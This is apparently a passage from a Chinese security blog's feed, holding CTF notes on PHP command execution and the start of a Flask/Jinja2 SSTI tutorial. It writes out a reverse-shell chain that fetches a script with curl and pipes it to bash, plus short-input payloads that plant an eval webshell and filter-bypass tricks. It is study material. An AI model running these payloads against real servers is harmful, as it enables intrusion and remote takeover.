class="line-numbers-rows"><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>1.首先在公网服务器用nc指令监听端口</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp port <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 2.然后在公网服务器上写一个文件（qwzf文件）</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp;/dev/tcp/ip/poat 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.在浏览器执行</p><pre class="line-numbers language-none"><code class="language-none">?cmd=curl ip:port/qwzf|bush<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="有限字符的命令执行"><a href="#有限字符的命令执行" class="headerlink" title="有限字符的命令执行"></a>有限字符的命令执行</h1><p>##14位可控</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"too long~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然只能传入14个字符</p><p>但是并没有限制命令执行次数</p><p>所以我们可以通过Linux下的<code>&gt;</code>符号与<code>&gt;&gt;</code>符号写入一段webshell到指定文件。</p><pre class="line-numbers language-none"><code class="language-none">echo \&lt;?php&gt;1echo eval\(&gt;&gt;1echo \$_GET&gt;&gt;1echo \[1\]&gt;&gt;1echo \)\;&gt;&gt;1mv 1 1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地起环境</p><p><img src="https://i.loli.net/2021/11/10/gioqP6AWsOr8nfH.png" alt="image-20210827105450559"></p><p>经测试 这种换号的php文件也可以运行</p><p><img src="https://i.loli.net/2021/11/10/kbWTq5M8s2LfNl6.png" alt="image-20210827105828450"></p><p>写入后蚁剑连接靶机</p><p><img src="https://i.loli.net/2021/11/10/EZS3ieU1pF562qG.png" alt="image-20210827104518584"></p><p>拿到flag</p><h2 id="7位可控"><a href="#7位可控" class="headerlink" title="7位可控"></a>7位可控</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;hr/&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"too long~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小知识点</p><pre class="line-numbers language-none"><code class="language-none">&gt;a #虽然没有输出但是会创建a这个文件ls -s #ls基于事件排序（从晚到早）sh a #sh会把a里面的每行内容当作命令来执行使用\进行命令拼接 #l\s=ls base64 #使用base64编码避免特殊字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目标写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_GET[1]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64编码后</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAgZXZhbCgkX0dFVFsxXSk7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们需要执行</p><pre class="line-numbers language-none"><code class="language-none">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&gt;hp&gt;1.p\\&gt;d\&gt;\\&gt;\ -\\&gt;e64\\&gt;bas\\&gt;7\|\\&gt;XSk\\&gt;Fsx\\&gt;dFV\\&gt;kX0\\&gt;bCg\\&gt;XZh\\&gt;Agz\\&gt;waH\\&gt;PD9\\&gt;o\ \\&gt;ech\\ls -t&gt;0sh 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/11/10/zRTA25W31q7GFoD.png" alt="image-20210827112202097"></p><h2 id="5位可控"><a href="#5位可控" class="headerlink" title="5位可控"></a>5位可控</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sandbox</span><span class="token operator">=</span><span class="token single-quoted-string string">'/var/www/html/sandbox'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"orange"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SERVER</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/bin/rm -rf'</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知识点：</p><pre class="line-numbers language-none"><code class="language-none">1.输入通配符* ,Linux会把第一个列出的文件名当做命令,剩下的文件名当作参数2.通过rev来倒置输出内容(rev命令将文件中的每行内容以字符为单位反序输出)3.用dir来代替ls不换行输出;rev将文件内容反向输出;在用ls是,写到a时每个文件名都是单独一行&gt;revecho '1233'&gt;v*v (等同于命令:rev v)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们需要把</p><pre class="line-numbers language-none"><code class="language-none">echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拆分然后执行</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&gt;dir&gt;f\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;a&gt;hp&gt;p\\&gt;1.\\&gt;\&gt;\\&gt;-d\\&gt;\\\&gt;64\\&gt;se\\&gt;ba\\&gt;\|\\&gt;7\\&gt;Sk\\&gt;X\\&gt;x\\&gt;Fs\\&gt;FV\\&gt;d\\&gt;X0\\&gt;k\\&gt;g\\&gt;bC\\&gt;h\\&gt;XZ\\&gt;gZ\\&gt;A\\&gt;aH\\&gt;w\\&gt;D9\\&gt;P\\&gt;S}\\&gt;IF\\&gt;{\\&gt;\$\\&gt;o\\&gt;ch\\&gt;e\\sh ash f <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="无字母shell"><a href="#无字母shell" class="headerlink" title="无字母shell"></a>无字母shell</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>有的时候会遇到这样的情况：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-z0-9]'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'h3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>h3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了数字和字母</p><p>这里们可以用到异或</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"."</span><span class="token operator">^</span><span class="token double-quoted-string string">"~"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出结果为：</p><pre class="line-numbers language-none"><code class="language-none">P<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHP中，两个变量进行异或的时候，会先将把字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。</p><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>1、二进制的最高位是符号位，0表示正数，1表示附属</p><p>2、正数的原码，反码，补码都是相同</p><p>3、负数的反码=它的原码的符号位不变，其它位取反（0-&gt;1,1-&gt;0）</p><p>4、负数的补码=它的反码+1</p><p>5、0的反码、补码都是0</p><p>6、PHP没有无符号数</p><p>7、在计算机运算的时候，都是以补码的方式来运算，那么运算的结果也是某个数的补码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#%8F%97%8F%96%91%99%90</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>##通配符</p><p>使用``反引号+”shell”的方式来getshell</p><p>shell下可以利用<code>.</code>来执行任意脚本</p><p><code>.</code>或者叫<code>period</code>，他的作用和<code>source</code>一样，就是用当前的shell执行一个文件中命令。比如，当前运行的shell是bash，则<code>.file</code>的意思就是用bash执行file文件中的命令</p><p>glob通配符</p><p><code>*</code>可以代替0个及以上任意字符</p><p><code>?</code>可以代表一个任意字符</p><p>用<code>[^x]</code>的方法来构造”这个位置不是字符x”</p><p>[0-9]来表示一个范围</p><blockquote><p><a href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a></p><p>这里有glob的更多内容</p></blockquote><h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><h3 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h3><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>cat</td><td>由第一行开始显示内容，并将所有内容输出</td></tr><tr><td>tac</td><td>从最后一行倒序显示内容，并将所有内容输出</td></tr><tr><td>more</td><td>根据窗口大小，一页一页的显示文件</td></tr><tr><td>less</td><td>和more累死，但是可以往前翻页，而且可以搜索字符</td></tr><tr><td>head</td><td>只显示头几行</td></tr><tr><td>tail</td><td>只显示最后几行</td></tr><tr><td>nl</td><td>累死于cat -n，显示的时候输出行号</td></tr><tr><td>tailf</td><td>类似于tail -f</td></tr><tr><td>od</td><td>读取所给予的文件的内容，并将其内容以八进制的字码显示出来</td></tr><tr><td>sort</td><td>将文件内容排序</td></tr><tr><td>rev</td><td>将文件中的每行内容以字符为单位反序输出</td></tr><tr><td>string</td><td>打印文件中可打印的字符</td></tr><tr><td>cut</td><td>-f 1 filename从文件的每一行剪切字节，字符和字段并将这些字节，字符和字段写至标准输出</td></tr></tbody></table><h3 id="2-查找文件"><a href="#2-查找文件" class="headerlink" title="2.查找文件"></a>2.查找文件</h3><pre class="line-numbers language-none"><code class="language-none">find . -name "fla*"locate fla* locate 命令无需指定路径，直接搜索即可。该命令实在mlocate.db的数据库下搜索，这个数据库位于/var/lib/mlocate/mlocate.db 它包含了系统中所有文件的索引，并且会在每天早上的时候由cron工具自动更新一次，可以sudo updadb更新其数据库which 命令主要用来查询可执行文件的位置whereis 命令会在系统默认安装目录（一般是用root权限时默认安装的软件）查找二进制文件、源码、文档中包含给定查询关键词的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-寻找文件内容"><a href="#3-寻找文件内容" class="headerlink" title="3.寻找文件内容"></a>3.寻找文件内容</h3><pre class="line-numbers language-none"><code class="language-none">grep -ar fla* /     -a不忽略二进制文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-文件传输"><a href="#4-文件传输" class="headerlink" title="4.文件传输"></a>4.文件传输</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">curl 利用curl下载文件<span class="token shell-comment comment">#使用内置option: -o</span><span class="token shell-comment comment">#curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</span><span class="token shell-comment comment">#使用内置option: -O</span><span class="token shell-comment comment">#curl -O http:</span><span class="token comment">//www.linux.com/dodo1.jpg</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-命令分隔符"><a href="#5-命令分隔符" class="headerlink" title="5.命令分隔符"></a>5.命令分隔符</h3><pre class="line-numbers language-none"><code class="language-none">1.%0a ---&gt;换行符2.%0d ---&gt;回车符3.;符号 再shell中，担任"连续指令"功能的符号就是"分号"4.&amp;符号&amp;放在启动参数后面表示该进程为后台进程，默认情况下，进程是前台进程，这时九八shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望它在后台启动，可以在启动参数的时候加一个'&amp;'实现这个目的，进程切换到后台的时候，我们把它成为job，切换到后台的时候会输出相关job信息5.|符号，管道符左面命令的输出就作为管道符右面命令的输入，所以左边的输出不显示6.&amp;&amp;表示前一条命令执行时，才执行后一条命令7.||表示上一条命令执行失败后，才执行下一条命令8.命令终止符%00 %20 #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-列目录"><a href="#6-列目录" class="headerlink" title="6.列目录"></a>6.列目录</h3><pre class="line-numbers language-none"><code class="language-none">lsdir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>$IFS在Linux下表示分隔符，单纯的<code>cat$IFS2</code>,bash解释器会把整个IFS2当作变量名，所以导致输出不来结果，然后如果加一个<code>{}</code>就固定了变量名，同理在后面加个<code>$</code>可以起到截断的作用</p><pre class="line-numbers language-none"><code class="language-none">${IFS}$IFS$9&lt;&lt;&gt;{,}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h2><h3 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1.拼接"></a>1.拼接</h3><pre class="line-numbers language-none"><code class="language-none">a=c;b=at;c=flag;$a$b $c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-base64编码"><a href="#2-base64编码" class="headerlink" title="2.base64编码"></a>2.base64编码</h3><pre class="line-numbers language-none"><code class="language-none">`echo "Y2F0IGZsYWc="|base64 -d`echo "Y2F0IGZsYWc="|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-单引号、双引号"><a href="#3-单引号、双引号" class="headerlink" title="3.单引号、双引号"></a>3.单引号、双引号</h3><pre class="line-numbers language-none"><code class="language-none">c""at flagc''at flagca""t fl''ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>###4.反斜线 \</p><pre class="line-numbers language-none"><code class="language-none">c\at fl\ag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SSti基础学习</title>
    <link href="http://h3geeker.top/posts/b0c48792.html"/>
    <id>http://h3geeker.top/posts/b0c48792.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2021-11-11T03:57:13.470Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、SSTi服务器端模板注入的概念"><a href="#一、SSTi服务器端模板注入的概念" class="headerlink" title="一、SSTi服务器端模板注入的概念"></a>一、SSTi服务器端模板注入的概念</h1><p>SSTI服务器端模板注入(Server-Side Template Injection)，我们常见的注入有我们熟悉的SQL注入，两者的不通之处就是SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity，而两者的相同部分就是先从用户处获得值作为web应用模板内容的一部分，然后进行编译渲染，如果在其中用户插入了恶意内容，就可能导致一系列的不良后果，比如RCE、信息泄露、getshell等等（凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎，本文针对Python做主要学习）</p><pre class="line-numbers language-none"><code class="language-none">服务端-&gt;模板文件-&gt;模板引擎-&gt;用户端<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/09/27/7nlOTi5oteyqwaC.png"></p><h1 id="二、Flask基础"><a href="#二、Flask基础" class="headerlink" title="二、Flask基础"></a>二、Flask基础</h1><p>因为常用到SSTi的网站都是Python的网站</p><p>所以我在这里会记录一下Flask的基础，以便于学习</p><h2 id="1、Flask简介"><a href="#1、Flask简介" class="headerlink" title="1、Flask简介"></a>1、Flask简介</h2><ol><li>Flask是一个Python上的web应用框架</li><li>web应用框架是一个库和模块的集合，使web应用程序开发人员能够编写web应用程序，而不必担心协议，线程管理等低级细节</li><li>基于Werkzeug WSGI工具箱和Jinja2 模板引擎</li></ol><blockquote><p>Werkzeug 是一个 Python 的 HTTP 和 WSGI 工具库，可以方便的在 Python 程序中处理 HTTP 协议相关内容。</p><p>功能包括：</p><ul><li>HTTP header 解析和输出</li><li>易用的 request 和 response 对象</li><li>交互式 JavaScript 的浏览器调试器</li><li>100% WSGI 1.0 兼容</li><li>支持 Python 2.6, 2.7 和 3.3.</li><li>支持 Unicode</li><li>支持基本的 session 和签名 cookie</li><li>支持 unicode 的 URI 和 IRI 工具</li><li>内建用于修复 WSGI 服务器和浏览器 bug 的库</li><li>集成 URL 路由</li></ul><p>Jinja 是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。</p></blockquote><p>示例代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"Hello {{name}}"</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/09/27/qJ8sWtUkDjCSAwP.png"></p><h3 id="1-Jinjia模板特点"><a href="#1-Jinjia模板特点" class="headerlink" title="(1).Jinjia模板特点"></a>(1).Jinjia模板特点</h3><pre class="line-numbers language-none"><code class="language-none">{{...}}:装载一个变量，模板渲染时，会使用传进来的同名参数变量的代表值替换{%...%}:装载一个控制语句{#...#}:装载一个注释，模板渲染的时候会忽视这中间的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-Jinja2中for循环的内置常量"><a href="#2-Jinja2中for循环的内置常量" class="headerlink" title="(2).Jinja2中for循环的内置常量"></a>(2).Jinja2中for循环的内置常量</h3><table><thead><tr><th>常量</th><th>说明</th></tr></thead><tbody><tr><td>loop.index</td><td>当前迭代的索引（从0开始）</td></tr><tr><td>loop.first</td><td>是否是第一次迭代，返回<code>true</code> or <code>false</code></td></tr><tr><td>loop.last</td><td>是否是最后一次迭代，返回<code>true</code> or <code>false</code></td></tr><tr><td>loop.length</td><td>序列的长度</td></tr></tbody></table><blockquote><p>不可以使用<code>continue</code>和<code>break</code>表达式来控制循环的执行</p></blockquote><h3 id="3-过滤器"><a href="#3-过滤器" class="headerlink" title="(3).过滤器"></a>(3).过滤器</h3><p>过滤器是通过管道符<code>|</code>来使用的，例如<code>{{name|length}}</code>：来返回name的长度</p><p>过滤器想当于一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值然后把结果渲染到页面中</p><p>#三、SSTi漏洞的产生</p><p>##1、漏洞成因</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性</p><p>如果再渲染之前，存在接受用户输入的操作，并且未经任何处理就将其作为 Web 应用模板内容的一部分，就有可能造成SSTi漏洞的产生</p><p>举一个例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token keyword">from</span> flask<span class="token punctuation">.</span><span class="token builtin">globals</span> <span class="token keyword">import</span> request<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'hack'</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>    <span class="token keyword">return</span> info<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码中在渲染前就存在着接受用户输入的操作，我们可以验证一下是否可以注入</p><p><img src="https://i.loli.net/2021/09/27/UaVtx4AYyQIl9uS.png"></p><p>我们传入测试payload</p><p><img src="https://i.loli.net/2021/09/27/3a1fIXhuJeNy4ZW.png"></p><p>可以看到测试payload被成功执行</p><p>此时我们就证明漏洞存在，也就意味着我们能够在这个注入点执行该模板引擎的控制语句寄命令</p><p>Flask SSTi漏洞的基本思路就是利用Python中的各种魔术方法来利用</p><h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" 